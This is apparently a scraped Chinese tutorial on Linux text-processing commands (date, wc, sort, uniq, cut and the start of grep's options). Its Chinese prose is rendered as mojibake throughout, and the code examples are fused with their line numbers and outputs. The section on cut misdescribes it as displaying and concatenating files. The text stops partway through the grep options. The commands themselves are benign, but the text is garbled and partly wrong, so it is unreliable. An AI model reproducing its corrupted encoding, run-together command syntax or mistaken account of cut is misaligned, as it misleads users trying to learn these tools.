~ # A=`date +%Y-%m-%d`cts1 ~ # B=`date +%Y-%m-%d -d "$A +48 hours"`cts1 ~ # echo $B2018-05-30 2. æ–‡æœ¬å¤„ç†wcåŠŸèƒ½ï¼š ç»Ÿè®¡æ–‡ä»¶è¡Œæ•°ã€å­—èŠ‚ã€å­—ç¬¦æ•° é€‰é¡¹1234567-c # ç»Ÿè®¡å­—èŠ‚æ•°ï¼Œæˆ–--bytesæˆ–â€”â€”charsï¼šåªæ˜¾ç¤ºBytesæ•°ï¼›ã€‚-l # ç»Ÿè®¡è¡Œæ•°ï¼Œæˆ–â€”â€”linesï¼šåªæ˜¾ç¤ºåˆ—æ•°ï¼›ã€‚-m # ç»Ÿè®¡å­—ç¬¦æ•°ã€‚è¿™ä¸ªæ ‡å¿—ä¸èƒ½ä¸ -c æ ‡å¿—ä¸€èµ·ä½¿ç”¨ã€‚-w # ç»Ÿè®¡å­—æ•°ï¼Œæˆ–â€”â€”wordsï¼šåªæ˜¾ç¤ºå­—æ•°ã€‚ä¸€ä¸ªå­—è¢«å®šä¹‰ä¸ºç”±ç©ºç™½ã€è·³æ ¼æˆ–æ¢è¡Œå­—ç¬¦åˆ†éš”çš„å­—ç¬¦ä¸²ã€‚-L # æ‰“å°æœ€é•¿è¡Œçš„é•¿åº¦ã€‚-help # æ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯--version # æ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯ ä¾‹å­123456789101112131415161718192021222324wc -l * # ç»Ÿè®¡å½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶è¡Œæ•°wc -l *.js # ç»Ÿè®¡å½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰ .js åç¼€çš„æ–‡ä»¶è¡Œæ•°find . * | xargs wc -l # å½“å‰ç›®å½•ä»¥åŠå­ç›®å½•çš„æ‰€æœ‰æ–‡ä»¶è¡Œæ•° wc test.txt # æŸ¥çœ‹æ–‡ä»¶çš„å­—èŠ‚æ•°ã€å­—æ•°ã€è¡Œæ•°# æŸ¥çœ‹æ–‡ä»¶çš„å­—èŠ‚æ•°ã€å­—æ•°ã€è¡Œæ•°wc test.txt# è¾“å‡ºç»“æœ7 8 70 test.txtè¡Œæ•° å•è¯æ•° å­—èŠ‚æ•° æ–‡ä»¶å# ç”¨wcå‘½ä»¤åªæ‰“å°ç»Ÿè®¡æ–‡ä»¶è¡Œæ•°ä¸æ‰“å°æ–‡ä»¶åwc -l test.txt # è¾“å‡ºç»“æœ7 test.txt# ç”¨æ¥ç»Ÿè®¡å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶æ•°ls -l | wc -l# è¾“å‡ºç»“æœ8# ç»Ÿè®¡æ–‡ä»¶å­—æ•°ï¼šcts1 ~ # wc -w date.txt30 date.txt sortsortå‘½ä»¤ æ˜¯åœ¨Linuxé‡Œéå¸¸æœ‰ç”¨ï¼Œå®ƒå°†æ–‡ä»¶è¿›è¡Œæ’åºï¼Œå¹¶å°†æ’åºç»“æœæ ‡å‡†è¾“å‡ºã€‚sortå‘½ä»¤æ—¢å¯ä»¥ä»ç‰¹å®šçš„æ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥ä»stdinä¸­è·å–è¾“å…¥ã€‚ é€‰é¡¹123456789101112131415-bï¼šå¿½ç•¥æ¯è¡Œå‰é¢å¼€å§‹å‡ºçš„ç©ºæ ¼å­—ç¬¦ï¼›-cï¼šæ£€æŸ¥æ–‡ä»¶æ˜¯å¦å·²ç»æŒ‰ç…§é¡ºåºæ’åºï¼›-dï¼šæ’åºæ—¶ï¼Œå¤„ç†è‹±æ–‡å­—æ¯ã€æ•°å­—åŠç©ºæ ¼å­—ç¬¦å¤–ï¼Œå¿½ç•¥å…¶ä»–çš„å­—ç¬¦ï¼›-fï¼šæ’åºæ—¶ï¼Œå°†å°å†™å­—æ¯è§†ä¸ºå¤§å†™å­—æ¯ï¼›-iï¼šæ’åºæ—¶ï¼Œé™¤äº†040è‡³176ä¹‹é—´çš„ASCIIå­—ç¬¦å¤–ï¼Œå¿½ç•¥å…¶ä»–çš„å­—ç¬¦ï¼›-mï¼šå°†å‡ ä¸ªæ’åºå·çš„æ–‡ä»¶è¿›è¡Œåˆå¹¶ï¼›-Mï¼šå°†å‰é¢3ä¸ªå­—æ¯ä¾ç…§æœˆä»½çš„ç¼©å†™è¿›è¡Œæ’åºï¼›-nï¼šä¾ç…§æ•°å€¼çš„å¤§å°æ’åºï¼›-o&lt;è¾“å‡ºæ–‡ä»¶&gt;ï¼šå°†æ’åºåçš„ç»“æœå­˜å…¥åˆ¶å®šçš„æ–‡ä»¶ï¼›-rï¼šä»¥ç›¸åçš„é¡ºåºæ¥æ’åºï¼›-t&lt;åˆ†éš”å­—ç¬¦&gt;ï¼šæŒ‡å®šæ’åºæ—¶æ‰€ç”¨çš„æ ä½åˆ†éš”å­—ç¬¦ï¼›-gï¼šæŒ‰ç…§å¸¸è§„æ•°å€¼æ’åº-kï¼šä½ç½®1,ä½ç½®2æ ¹æ®å…³é”®å­—æ’åºï¼Œåœ¨ä»ç¬¬ä½ç½®1å¼€å§‹ï¼Œä½ç½®2ç»“æŸ+&lt;èµ·å§‹æ ä½&gt;-&lt;ç»“æŸæ ä½&gt;ï¼šä»¥æŒ‡å®šçš„æ ä½æ¥æ’åºï¼ŒèŒƒå›´ç”±èµ·å§‹æ ä½åˆ°ç»“æŸæ ä½çš„å‰ä¸€æ ä½ã€‚ å®ä¾‹ sortå°†æ–‡ä»¶/æ–‡æœ¬çš„æ¯ä¸€è¡Œä½œä¸ºä¸€ä¸ªå•ä½ï¼Œç›¸äº’æ¯”è¾ƒï¼Œæ¯”è¾ƒåŸåˆ™æ˜¯ä»é¦–å­—ç¬¦å‘åï¼Œä¾æ¬¡æŒ‰ASCIIç å€¼è¿›è¡Œæ¯”è¾ƒï¼Œæœ€åå°†ä»–ä»¬æŒ‰å‡åºè¾“å‡ºã€‚ 123456789101112131415root@[mail text]# cat sort.txtaaa:10:1.1ccc:30:3.3ddd:40:4.4bbb:20:2.2eee:50:5.5eee:50:5.5[root@mail text]# sort sort.txtaaa:10:1.1bbb:20:2.2ccc:30:3.3ddd:40:4.4eee:50:5.5eee:50:5.5 å¿½ç•¥ç›¸åŒè¡Œä½¿ç”¨-ué€‰é¡¹æˆ–è€…uniqï¼š 1234567891011121314151617181920212223[root@mail text]# cat sort.txtaaa:10:1.1ccc:30:3.3ddd:40:4.4bbb:20:2.2eee:50:5.5eee:50:5.5[root@mail text]# sort -u sort.txtaaa:10:1.1bbb:20:2.2ccc:30:3.3ddd:40:4.4eee:50:5.5æˆ–è€…[root@mail text]# uniq sort.txtaaa:10:1.1ccc:30:3.3ddd:40:4.4bbb:20:2.2eee:50:5.5 sortçš„-nã€-rã€-kã€-té€‰é¡¹çš„ä½¿ç”¨ï¼š 123456789101112131415161718192021222324252627282930313233[root@mail text]# cat sort.txtAAA:BB:CCaaa:30:1.6ccc:50:3.3ddd:20:4.2bbb:10:2.5eee:40:5.4eee:60:5.1#å°†BBåˆ—æŒ‰ç…§æ•°å­—ä»å°åˆ°å¤§é¡ºåºæ’åˆ—ï¼š[root@mail text]# sort -nk 2 -t: sort.txtAAA:BB:CCbbb:10:2.5ddd:20:4.2aaa:30:1.6eee:40:5.4ccc:50:3.3eee:60:5.1#å°†CCåˆ—æ•°å­—ä»å¤§åˆ°å°é¡ºåºæ’åˆ—ï¼š[root@mail text]# sort -nrk 3 -t: sort.txteee:40:5.4eee:60:5.1ddd:20:4.2ccc:50:3.3bbb:10:2.5aaa:30:1.6AAA:BB:CC# -næ˜¯æŒ‰ç…§æ•°å­—å¤§å°æ’åºï¼Œ-ræ˜¯ä»¥ç›¸åé¡ºåºï¼Œ-kæ˜¯æŒ‡å®šéœ€è¦æ’åºçš„æ ä½ï¼Œ-tæŒ‡å®šæ ä½åˆ†éš”ç¬¦ä¸ºå†’å·# å¤šåˆ—æ’åºï¼šä»¥:åˆ†éš”ï¼ŒæŒ‰ç¬¬äºŒåˆ—æ•°å€¼æ’å€’åºï¼Œç¬¬ä¸‰åˆ—æ­£åº[linux@linux ~]$ sort -n -t: -k2,2r -k3 sort.txt -ké€‰é¡¹çš„å…·ä½“è¯­æ³•æ ¼å¼ï¼š x,x è¡¨ç¤ºä¸€ä¸ªèŒƒå›´ 123FStart.CStart Modifie,FEnd.CEnd Modifier-------Start--------,-------End-------- FStart.CStart é€‰é¡¹ , FEnd.CEnd é€‰é¡¹ è¿™ä¸ªè¯­æ³•æ ¼å¼å¯ä»¥è¢«å…¶ä¸­çš„é€—å·,åˆ†ä¸ºä¸¤å¤§éƒ¨åˆ†ï¼Œ Start éƒ¨åˆ†å’Œ End éƒ¨åˆ†ã€‚Startéƒ¨åˆ†ä¹Ÿç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼Œå…¶ä¸­çš„Modifieréƒ¨åˆ†å°±æ˜¯æˆ‘ä»¬ä¹‹å‰è¯´è¿‡çš„ç±»ä¼¼nå’Œrçš„é€‰é¡¹éƒ¨åˆ†ã€‚æˆ‘ä»¬é‡ç‚¹è¯´è¯´Startéƒ¨åˆ†çš„FStartå’ŒC.Startã€‚C.Startä¹Ÿæ˜¯å¯ä»¥çœç•¥çš„ï¼Œçœç•¥çš„è¯å°±è¡¨ç¤ºä»æœ¬åŸŸçš„å¼€å¤´éƒ¨åˆ†å¼€å§‹ã€‚FStart.CStartï¼Œå…¶ä¸­FStartå°±æ˜¯è¡¨ç¤ºä½¿ç”¨çš„åŸŸï¼Œè€ŒCStartåˆ™è¡¨ç¤ºåœ¨FStartåŸŸä¸­ä»ç¬¬å‡ ä¸ªå­—ç¬¦å¼€å§‹ç®—â€œæ’åºé¦–å­—ç¬¦â€ã€‚åŒç†ï¼Œåœ¨Endéƒ¨åˆ†ä¸­ï¼Œä½ å¯ä»¥è®¾å®šFEnd.CEndï¼Œå¦‚æœä½ çœç•¥.CEndï¼Œåˆ™è¡¨ç¤ºç»“å°¾åˆ°â€œåŸŸå°¾â€ï¼Œå³æœ¬åŸŸçš„æœ€åä¸€ä¸ªå­—ç¬¦ã€‚æˆ–è€…ï¼Œå¦‚æœä½ å°†CEndè®¾å®šä¸º0(é›¶)ï¼Œä¹Ÿæ˜¯è¡¨ç¤ºç»“å°¾åˆ°â€œåŸŸå°¾â€ã€‚ ä»å…¬å¸è‹±æ–‡åç§°çš„ç¬¬äºŒä¸ªå­—æ¯å¼€å§‹è¿›è¡Œæ’åºï¼š 1234567# å…ˆåˆ›å»ºæ­¤txtæ–‡ä»¶# å†æ’åº$ sort -t ' ' -k 1.2 facebook.txtbaidu 100 5000sohu 100 4500google 110 5000guge 50 3000 -t &#39; &#39;, é¦–å…ˆç”¨&#39; &#39;ç©ºæ ¼, æŠŠå­—æ®µåˆ†å‰²æˆäº†3ä¸ªåŸŸ. ä½¿ç”¨äº†-k 1.2ï¼Œè¡¨ç¤ºå¯¹ç¬¬ä¸€ä¸ªåŸŸçš„ç¬¬äºŒä¸ªå­—ç¬¦å¼€å§‹åˆ°æœ¬åŸŸçš„æœ€åä¸€ä¸ªå­—ç¬¦ä¸ºæ­¢çš„å­—ç¬¦ä¸²è¿›è¡Œæ’åºã€‚ä½ ä¼šå‘ç°baiduå› ä¸ºç¬¬äºŒä¸ªå­—æ¯æ˜¯aè€Œååˆ—æ¦œé¦–ã€‚sohuå’Œ googleç¬¬äºŒä¸ªå­—ç¬¦éƒ½æ˜¯oï¼Œä½†sohuçš„håœ¨googleçš„oå‰é¢ï¼Œæ‰€ä»¥ä¸¤è€…åˆ†åˆ«æ’åœ¨ç¬¬äºŒå’Œç¬¬ä¸‰ã€‚gugeåªèƒ½å±ˆå±…ç¬¬å››äº†ã€‚ åªé’ˆå¯¹å…¬å¸è‹±æ–‡åç§°çš„ç¬¬äºŒä¸ªå­—æ¯è¿›è¡Œæ’åºï¼Œå¦‚æœç›¸åŒçš„æŒ‰ç…§å‘˜å·¥å·¥èµ„è¿›è¡Œé™åºæ’åºï¼š 12345$ sort -t ' ' -k 1.2,1.2 -nrk 3,3 facebook.txtbaidu 100 5000google 110 5000sohu 100 4500guge 50 3000 ç”±äºåªå¯¹ç¬¬äºŒä¸ªå­—æ¯è¿›è¡Œæ’åºï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨äº†-k 1.2,1.2çš„è¡¨ç¤ºæ–¹å¼ï¼Œè¡¨ç¤ºæˆ‘ä»¬â€œåªâ€å¯¹ç¬¬äºŒä¸ªå­—æ¯è¿›è¡Œæ’åºã€‚ï¼ˆå¦‚æœä½ é—®â€œæˆ‘ä½¿ç”¨-k 1.2æ€ä¹ˆä¸è¡Œï¼Ÿâ€ï¼Œå½“ç„¶ä¸è¡Œï¼Œå› ä¸ºä½ çœç•¥äº†Endéƒ¨åˆ†ï¼Œè¿™å°±æ„å‘³ç€ä½ å°†å¯¹ä»ç¬¬äºŒä¸ªå­—æ¯èµ·åˆ°æœ¬åŸŸæœ€åä¸€ä¸ªå­—ç¬¦ä¸ºæ­¢çš„å­—ç¬¦ä¸²è¿›è¡Œæ’åºï¼‰ã€‚å¯¹äºå‘˜å·¥å·¥èµ„è¿›è¡Œæ’ åºï¼Œæˆ‘ä»¬ä¹Ÿä½¿ç”¨äº†-k 3,3ï¼Œè¿™æ˜¯æœ€å‡†ç¡®çš„è¡¨è¿°ï¼Œè¡¨ç¤ºæˆ‘ä»¬â€œåªâ€å¯¹æœ¬åŸŸè¿›è¡Œæ’åºï¼Œå› ä¸ºå¦‚æœä½ çœç•¥äº†åé¢çš„3ï¼Œå°±å˜æˆäº†æˆ‘ä»¬â€œå¯¹ç¬¬3ä¸ªåŸŸå¼€å§‹åˆ°æœ€åä¸€ä¸ªåŸŸä½ç½®çš„å†…å®¹è¿›è¡Œæ’åºâ€ äº†ã€‚ uniquniqå‘½ä»¤ ç”¨äºæŠ¥å‘Šæˆ–å¿½ç•¥æ–‡ä»¶ä¸­çš„é‡å¤è¡Œï¼Œä¸€èˆ¬ä¸sortå‘½ä»¤ç»“åˆä½¿ç”¨ã€‚ é€‰é¡¹123456-cæˆ–â€”â€”countï¼šåœ¨æ¯åˆ—æ—è¾¹æ˜¾ç¤ºè¯¥è¡Œé‡å¤å‡ºç°çš„æ¬¡æ•°ï¼›-dæˆ–--repeatedï¼šä»…æ˜¾ç¤ºé‡å¤å‡ºç°çš„è¡Œåˆ—ï¼›-f&lt;æ ä½&gt;æˆ–--skip-fields=&lt;æ ä½&gt;ï¼šå¿½ç•¥æ¯”è¾ƒæŒ‡å®šçš„æ ä½ï¼›-s&lt;å­—ç¬¦ä½ç½®&gt;æˆ–--skip-chars=&lt;å­—ç¬¦ä½ç½®&gt;ï¼šå¿½ç•¥æ¯”è¾ƒæŒ‡å®šçš„å­—ç¬¦ï¼›-uæˆ–â€”â€”uniqueï¼šä»…æ˜¾ç¤ºå‡ºä¸€æ¬¡çš„è¡Œåˆ—ï¼›-w&lt;å­—ç¬¦ä½ç½®&gt;æˆ–--check-chars=&lt;å­—ç¬¦ä½ç½®&gt;ï¼šæŒ‡å®šè¦æ¯”è¾ƒçš„å­—ç¬¦ã€‚ å‚æ•° è¾“å…¥æ–‡ä»¶ï¼šæŒ‡å®šè¦å»é™¤çš„é‡å¤è¡Œæ–‡ä»¶ã€‚å¦‚æœä¸æŒ‡å®šæ­¤é¡¹ï¼Œåˆ™ä»æ ‡å‡†è¯»å–æ•°æ®ï¼› è¾“å‡ºæ–‡ä»¶ï¼šæŒ‡å®šè¦å»é™¤é‡å¤è¡Œåçš„å†…å®¹è¦å†™å…¥çš„è¾“å‡ºæ–‡ä»¶ã€‚å¦‚æœä¸æŒ‡å®šæ­¤é€‰é¡¹ï¼Œåˆ™å°†å†…å®¹æ˜¾ç¤ºåˆ°æ ‡å‡†è¾“å‡ºè®¾å¤‡ï¼ˆæ˜¾ç¤ºç»ˆç«¯ï¼‰ã€‚ å®ä¾‹12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758[root]# cat sort.txt : åŸæœ¬è¡Œaaa:10:1.1ccc:30:3.3ddd:40:4.4bbb:20:2.2eee:50:5.5eee:50:5.5[root]# uniq sort.txt : ä¸å±•ç¤ºé‡å¤è¡Œaaa:10:1.1ccc:30:3.3ddd:40:4.4bbb:20:2.2eee:50:5.5[cts1:Desktop][cts1:Desktop][root]# sort sort.txt | uniq : ä¸å±•ç¤ºé‡å¤è¡Œaaa:10:1.1bbb:20:2.2ccc:30:3.3ddd:40:4.4eee:50:5.5[cts1:Desktop][root]# uniq -u sort.txt : åˆ é™¤é‡å¤è¡Œaaa:10:1.1ccc:30:3.3ddd:40:4.4bbb:20:2.2[cts1:Desktop][root]# sort sort.txt | uniq -u : æ’åºå¹¶åˆ é™¤é‡å¤è¡Œaaa:10:1.1bbb:20:2.2ccc:30:3.3ddd:40:4.4[cts1:Desktop][root]# sort sort.txt | uniq -c : å±•ç¤ºæ¯è¡Œå‡ºç°çš„æ¬¡æ•° 1 aaa:10:1.1 1 bbb:20:2.2 1 ccc:30:3.3 1 ddd:40:4.4 2 eee:50:5.5[cts1:Desktop][root]# sort sort.txt | uniq -d : åªå±•ç¤ºé‡å¤è¡Œeee:50:5.5# æ±‚a.txtå’Œb.txtçš„å·®é›† ## é¦–å…ˆa b å»æ‰é‡å¤çš„, å†è·Ÿa bå»é‡, æŠŠbå…¶å®ƒçš„éƒ¨åˆ†ä¹Ÿå»æ‰cts1 Desktop # cat a b b | sort | uniq -uab# æ±‚b.txtå’Œa.txtçš„å·®é›† ## åŒä¸Šcts1 Desktop # cat b a a | sort | uniq -uef cutcutå‘½ä»¤ ç”¨æ¥æ˜¾ç¤ºè¡Œä¸­çš„æŒ‡å®šéƒ¨åˆ†ï¼Œåˆ é™¤æ–‡ä»¶ä¸­æŒ‡å®šå­—æ®µã€‚cutç»å¸¸ç”¨æ¥æ˜¾ç¤ºæ–‡ä»¶çš„å†…å®¹ï¼Œç±»ä¼¼äºä¸‹çš„typeå‘½ä»¤ã€‚ è¯´æ˜ï¼šè¯¥å‘½ä»¤æœ‰ä¸¤é¡¹åŠŸèƒ½ï¼Œå…¶ä¸€æ˜¯ç”¨æ¥æ˜¾ç¤ºæ–‡ä»¶çš„å†…å®¹ï¼Œå®ƒä¾æ¬¡è¯»å–ç”±å‚æ•°fileæ‰€æŒ‡ æ˜çš„æ–‡ä»¶ï¼Œå°†å®ƒä»¬çš„å†…å®¹è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºä¸Šï¼›å…¶äºŒæ˜¯è¿æ¥ä¸¤ä¸ªæˆ–å¤šä¸ªæ–‡ä»¶ï¼Œå¦‚cut fl f2 &gt; f3å°†æŠŠæ–‡ä»¶flå’Œå‡ çš„å†…å®¹åˆå¹¶èµ·æ¥ï¼Œç„¶åé€šè¿‡è¾“å‡ºé‡å®šå‘ç¬¦â€œ&gt;â€çš„ä½œç”¨ï¼Œå°†å®ƒä»¬æ”¾å…¥æ–‡ä»¶f3ä¸­ã€‚ å½“æ–‡ä»¶è¾ƒå¤§æ—¶ï¼Œæ–‡æœ¬åœ¨å±å¹•ä¸Šè¿…é€Ÿé—ªè¿‡ï¼ˆæ»šå±ï¼‰ï¼Œç”¨æˆ·å¾€å¾€çœ‹ä¸æ¸…æ‰€æ˜¾ç¤ºçš„å†…å®¹ã€‚å› æ­¤ï¼Œä¸€èˆ¬ç”¨moreç­‰å‘½ä»¤åˆ†å±æ˜¾ç¤ºã€‚ä¸ºäº†æ§åˆ¶æ»šå±ï¼Œå¯ä»¥æŒ‰Ctrl+Sé”®ï¼Œåœæ­¢æ»šå±ï¼›æŒ‰Ctrl+Qé”®å¯ä»¥æ¢å¤æ»šå±ã€‚æŒ‰Ctrl+Cï¼ˆä¸­æ–­ï¼‰é”®å¯ä»¥ç»ˆæ­¢è¯¥å‘½ä»¤çš„æ‰§è¡Œï¼Œå¹¶ä¸”è¿”å›Shellæç¤ºç¬¦çŠ¶æ€ã€‚ é€‰é¡¹123456789-bï¼šä»…æ˜¾ç¤ºè¡Œä¸­æŒ‡å®šç›´æ¥èŒƒå›´çš„å†…å®¹ï¼›-cï¼šä»…æ˜¾ç¤ºè¡Œä¸­æŒ‡å®šèŒƒå›´çš„å­—ç¬¦ï¼› -dï¼šæŒ‡å®šå­—æ®µçš„åˆ†éš”ç¬¦ï¼Œé»˜è®¤çš„å­—æ®µåˆ†éš”ç¬¦ä¸ºâ€œTABâ€ï¼› -fï¼šæ˜¾ç¤ºæŒ‡å®šå­—æ®µçš„å†…å®¹ï¼›-nï¼šä¸â€œ-bâ€é€‰é¡¹è¿ç”¨ï¼Œä¸åˆ†å‰²å¤šå­—èŠ‚å­—ç¬¦ï¼›--complementï¼šè¡¥è¶³è¢«é€‰æ‹©çš„å­—èŠ‚ã€å­—ç¬¦æˆ–å­—æ®µï¼›--out-delimiter=&lt;å­—æ®µåˆ†éš”ç¬¦&gt;ï¼šæŒ‡å®šè¾“å‡ºå†…å®¹æ˜¯çš„å­—æ®µåˆ†å‰²ç¬¦ï¼›--helpï¼šæ˜¾ç¤ºæŒ‡ä»¤çš„å¸®åŠ©ä¿¡æ¯ï¼›--versionï¼šæ˜¾ç¤ºæŒ‡ä»¤çš„ç‰ˆæœ¬ä¿¡æ¯ã€‚ å‚æ•°æ–‡ä»¶ï¼šæŒ‡å®šè¦è¿›è¡Œå†…å®¹è¿‡æ»¤çš„æ–‡ä»¶ã€‚ å®ä¾‹ä¾‹å¦‚æœ‰ä¸€ä¸ªå­¦ç”ŸæŠ¥è¡¨ä¿¡æ¯ï¼ŒåŒ…å«Noã€Nameã€Markã€Percentï¼š 12345[root@localhost text]# cat cut.txt No Name Mark Percent01 tom 69 9102 jack 71 8703 alex 68 98 -fä½¿ç”¨-f é€‰é¡¹æå–æŒ‡å®šå­—æ®µ 12345[root@localhost text]# cut -d ' ' -f1 cut.txt No010203 12345[root@localhost text]# cut -d ' ' -f2,3 test.txt Name Marktom 69jack 71alex 68 â€“complementé€‰é¡¹æå–æŒ‡å®šå­—æ®µä¹‹å¤–çš„åˆ—ï¼ˆæ‰“å°é™¤äº†ç¬¬äºŒåˆ—ä¹‹å¤–çš„åˆ—ï¼‰ï¼š 12345cut -d ' ' -f2 --complement cut.txtNo Mark Percent01 69 9102 71 8703 68 98 æŒ‡å®šå­—æ®µçš„å­—ç¬¦æˆ–è€…å­—èŠ‚èŒƒå›´ &amp; ä¾‹å­cutå‘½ä»¤å¯ä»¥å°†ä¸€ä¸²å­—ç¬¦ä½œä¸ºåˆ—æ¥æ˜¾ç¤ºï¼Œå­—ç¬¦å­—æ®µçš„è®°æ³•ï¼š N- ï¼šä»ç¬¬Nä¸ªå­—èŠ‚ã€å­—ç¬¦ã€å­—æ®µåˆ°ç»“å°¾ï¼› N-M ï¼šä»ç¬¬Nä¸ªå­—èŠ‚ã€å­—ç¬¦ã€å­—æ®µåˆ°ç¬¬Mä¸ªï¼ˆåŒ…æ‹¬Måœ¨å†…ï¼‰å­—èŠ‚ã€å­—ç¬¦ã€å­—æ®µï¼› -M ï¼šä»ç¬¬1ä¸ªå­—èŠ‚ã€å­—ç¬¦ã€å­—æ®µåˆ°ç¬¬Mä¸ªï¼ˆåŒ…æ‹¬Måœ¨å†…ï¼‰å­—èŠ‚ã€å­—ç¬¦ã€å­—æ®µã€‚ ä¸Šé¢æ˜¯è®°æ³•ï¼Œç»“åˆä¸‹é¢é€‰é¡¹å°†æ‘¸ä¸ªèŒƒå›´çš„å­—èŠ‚ã€å­—ç¬¦æŒ‡å®šä¸ºå­—æ®µï¼š -b è¡¨ç¤ºå­—èŠ‚ï¼› -c è¡¨ç¤ºå­—ç¬¦ï¼› -f è¡¨ç¤ºå®šä¹‰å­—æ®µã€‚ å®ä¾‹123456789101112131415161718192021222324252627282930[root@localhost text]# cat test.txt abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz# æ‰“å°ç¬¬1ä¸ªåˆ°ç¬¬3ä¸ªå­—ç¬¦ï¼šcut -c1-3 test.txt abcabcabcabcabc# æ‰“å°å‰2ä¸ªå­—ç¬¦ï¼šcut -c-2 test.txt ababababab# æ‰“å°ä»ç¬¬5ä¸ªå­—ç¬¦å¼€å§‹åˆ°ç»“å°¾ï¼šcut -c5- test.txt efghijklmnopqrstuvwxyzefghijklmnopqrstuvwxyzefghijklmnopqrstuvwxyzefghijklmnopqrstuvwxyzefghijklmnopqrstuvwxyz grep(æ–‡æœ¬ç”Ÿæˆå™¨)grep ï¼ˆglobal search regular expression(RE) and print out the lineï¼Œå…¨é¢æœç´¢æ­£åˆ™è¡¨è¾¾å¼å¹¶æŠŠè¡Œæ‰“å°å‡ºæ¥ï¼‰æ˜¯ä¸€ç§å¼ºå¤§çš„æ–‡æœ¬æœç´¢å·¥å…·ï¼Œå®ƒèƒ½ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æœç´¢æ–‡æœ¬ï¼Œå¹¶æŠŠåŒ¹é…çš„è¡Œæ‰“å°å‡ºæ¥ã€‚ç”¨äºè¿‡æ»¤/æœç´¢çš„ç‰¹å®šå­—ç¬¦ã€‚å¯ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼èƒ½å¤šç§å‘½ä»¤é…åˆä½¿ç”¨ï¼Œä½¿ç”¨ä¸Šååˆ†çµæ´»ã€‚ é€‰é¡¹123456789101112131415161718192021222324252627-a --text # ä¸è¦å¿½ç•¥äºŒè¿›åˆ¶æ•°æ®ã€‚-A &lt;æ˜¾ç¤ºè¡Œæ•°&gt; --after-context=&lt;æ˜¾ç¤ºè¡Œæ•°&gt; # é™¤äº†æ˜¾ç¤ºç¬¦åˆèŒƒæœ¬æ ·å¼çš„é‚£ä¸€è¡Œä¹‹å¤–ï¼Œå¹¶æ˜¾ç¤ºè¯¥è¡Œä¹‹åçš„å†…å®¹ã€‚-b --byte-offset # åœ¨æ˜¾ç¤ºç¬¦åˆèŒƒæœ¬æ ·å¼çš„é‚£ä¸€è¡Œä¹‹å¤–ï¼Œå¹¶æ˜¾ç¤ºè¯¥è¡Œä¹‹å‰çš„å†…å®¹ã€‚-B&lt;æ˜¾ç¤ºè¡Œæ•°&gt; --before-context=&lt;æ˜¾ç¤ºè¡Œæ•°&gt; # é™¤äº†æ˜¾ç¤ºç¬¦åˆæ ·å¼çš„é‚£ä¸€è¡Œä¹‹å¤–ï¼Œå¹¶æ˜¾ç¤ºè¯¥è¡Œä¹‹å‰çš„å†…å®¹ã€‚-c --count # è®¡ç®—ç¬¦åˆèŒƒæœ¬æ ·å¼çš„åˆ—æ•°ã€‚-C&lt;æ˜¾ç¤ºè¡Œæ•°&gt; --context=&lt;æ˜¾ç¤ºè¡Œæ•°&gt;æˆ–-&lt;æ˜¾ç¤ºè¡Œæ•°&gt; # é™¤äº†æ˜¾ç¤ºç¬¦åˆèŒƒæœ¬æ ·å¼çš„é‚£ä¸€åˆ—ä¹‹å¤–ï¼Œå¹¶æ˜¾ç¤ºè¯¥åˆ—ä¹‹å‰åçš„å†…å®¹ã€‚-d&lt;è¿›è¡ŒåŠ¨ä½œ&gt; --directories=&lt;åŠ¨ä½œ&gt; # å½“æŒ‡å®šè¦æŸ¥æ‰¾çš„æ˜¯ç›®å½•è€Œéæ–‡ä»¶æ—¶ï¼Œå¿…é¡»ä½¿ç”¨è¿™é¡¹å‚æ•°ï¼Œå¦åˆ™grepå‘½ä»¤å°†å›æŠ¥ä¿¡æ¯å¹¶åœæ­¢åŠ¨ä½œã€‚-e&lt;èŒƒæœ¬æ ·å¼&gt; --regexp=&lt;èŒƒæœ¬æ ·å¼&gt; # æŒ‡å®šå­—ç¬¦ä¸²ä½œä¸ºæŸ¥æ‰¾æ–‡ä»¶å†…å®¹çš„èŒƒæœ¬æ ·å¼ã€‚-E --extended-regexp # å°†èŒƒæœ¬æ ·å¼ä¸ºå»¶ä¼¸çš„æ™®é€šè¡¨ç¤ºæ³•æ¥ä½¿ç”¨ï¼Œæ„å‘³ç€ä½¿ç”¨èƒ½ä½¿ç”¨æ‰©å±•æ­£åˆ™è¡¨è¾¾å¼ã€‚-f&lt;èŒƒæœ¬æ–‡ä»¶&gt; --file=&lt;è§„åˆ™æ–‡ä»¶&gt; # æŒ‡å®šèŒƒæœ¬æ–‡ä»¶ï¼Œå…¶å†…å®¹æœ‰ä¸€ä¸ªæˆ–å¤šä¸ªèŒƒæœ¬æ ·å¼ï¼Œè®©grepæŸ¥æ‰¾ç¬¦åˆèŒƒæœ¬æ¡ä»¶çš„æ–‡ä»¶å†…å®¹ï¼Œæ ¼å¼ä¸ºæ¯ä¸€åˆ—çš„èŒƒæœ¬æ ·å¼ã€‚-F --fixed-regexp # å°†èŒƒæœ¬æ ·å¼è§†ä¸ºå›ºå®šå­—ç¬¦ä¸²çš„åˆ—è¡¨ã€‚-G --basic-regexp # å°†èŒƒæœ¬æ ·å¼è§†ä¸ºæ™®é€šçš„è¡¨ç¤ºæ³•æ¥ä½¿ç”¨ã€‚-h --no-filename # åœ¨æ˜¾ç¤ºç¬¦åˆèŒƒæœ¬æ ·å¼çš„é‚£ä¸€åˆ—ä¹‹å‰ï¼Œä¸æ ‡ç¤ºè¯¥åˆ—æ‰€å±çš„æ–‡ä»¶åç§°ã€‚-H --with-filename # åœ¨æ˜¾ç¤ºç¬¦åˆèŒƒæœ¬æ ·å¼çš„é‚£ä¸€åˆ—ä¹‹å‰ï¼Œæ ‡ç¤ºè¯¥åˆ—çš„æ–‡ä»¶åç§°ã€‚-i --ignore-case # 